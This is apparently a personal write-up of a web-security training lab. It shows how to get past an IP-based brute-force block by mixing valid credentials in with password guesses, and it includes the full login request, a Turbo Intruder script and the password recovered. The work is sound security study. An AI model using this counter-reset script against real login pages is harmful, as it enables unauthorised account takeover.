---
title: Broken brute-force protection, IP block
category: Authentication
difficulty: Practitioner
tags:
  - authentication-failures
  - brute-force
---
This is a lab similar to [[Labs/Authentication/username-enumeration-via-response-timing|Username enumeration via response timing]] because it also involves a brute-force prevention mechanism.

The hint in the lab description suggests including valid credentials at regular intervals, as this may reset the counter of failed login attempts for the IP-based block. Since the username is already given, we only need to brute-force the password.

Earlier testing showed that the brute-force filter is quite sensitive: after 2 failed attempts without a successful login, the IP is blocked.

I will use Turbo Intruder to automate this task. The request skeleton looks like this:
```http
POST /login HTTP/2
Host: 0a30(...)0f0.web-security-academy.net
Cookie: session=UIh(...)OczW
Content-Length: 30
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://0a30(...)0f0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a30(...)0f0.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

username=%s&password=%s
```

Even though we already know the username we want to attack, we still need a placeholder there so the script can periodically send valid credentials, as described above. The conditional statement inserts an additional request with known valid credentials after every 2 brute-force attempts.

It is also important to keep `concurrentConnections` set to `1`, since using multiple connections would not guarantee that the valid credentials are sent at the correct intervals.

Here's the Turbo Intruder snippet I used:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=200,
                           pipeline=False,
                           engine=Engine.THREADED
                           )

    i = 0
    for word in open('/home/kali/Downloads/PS-WSA-passwords.txt'):
        i += 1
        if (i % 2 == 0):
            engine.queue(target.req, ["wiener", "peter"]) #hardcode the known credentials

        engine.queue(target.req, ["carlos", word.rstrip()])


def handleResponse(req, interesting):
    table.add(req)

```

The script has found the correct password. The correct credentials are `carlos:123321`.